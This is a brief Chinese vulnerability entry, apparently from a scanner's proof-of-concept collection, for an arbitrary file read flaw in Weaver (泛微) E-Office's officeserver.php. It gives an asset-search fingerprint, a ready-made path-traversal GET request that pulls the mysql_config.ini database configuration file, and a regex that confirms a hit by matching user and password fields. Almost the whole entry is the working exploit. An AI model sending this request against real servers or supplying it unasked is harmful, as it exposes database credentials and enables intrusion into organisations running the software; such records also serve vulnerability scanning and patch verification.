# 泛微OAofficeserver任意文件读取漏洞

泛微OA ｜ 任意文件读取/写入 ｜ —
- **指纹**：`app="泛微-EOffice"`
- **请求**：`GET /iweboffice/officeserver.php?OPTION=LOADFILE&FILENAME=../mysql_config.ini HTTP/1.1`
- **响应特征**：200 ^(?=.*?user)(?=.*?password).*?$